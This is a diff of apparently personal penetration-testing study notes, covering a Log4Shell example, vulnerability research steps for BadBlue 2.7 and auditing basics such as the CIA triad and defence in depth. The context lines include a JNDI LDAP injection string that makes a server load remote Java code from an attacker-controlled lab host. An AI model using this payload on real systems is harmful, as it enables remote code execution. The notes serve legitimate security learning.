@@ -707,3 +707,48 @@ In the chat send : ${jndi:ldap://demo.ine:1389/yourcode}
 ---> server fails to parse input as str and evaluates the JNDI lookup
 ---> Java class (ie java code elsewhr) is pulled from the attackers LDAP server
 
+
+### Vulnerability research example
+Badblue 2.7
+
+Search on google
+searchsploit the services
+Search National Vulnerability Database
+Search on ExploitDB for PoC exploits
+--> Find arbitrary code execution etc
+
+
+# Auditing fundamentals
+
+## Cyber basics:
+
+CIA triad
+Confidentiality:
+For ur eyes only
+Integrity:
+Only authorised changes
+Availability:
+Service must be usable
+--> Balance the 3 to meet business needs
+
+Defence in depth
+- use multiple layers of security for holistsic protection
+Inclusive but not limited to:
+1. administrative controls
+	1. policy
+	2. Procedures
+2. Technical controls
+	1. Network
+	2. Software
+	3. Hardware
+3. Physical controls
+
+--> different frameworks exist
+
+Risk management (money plays a big factor)
+- cost to secure
+- cost if poorly secured
+- issurance
+- lawsuit
+- loss of revenue if intelectual property is lost
+--> Cost-benefit analysis
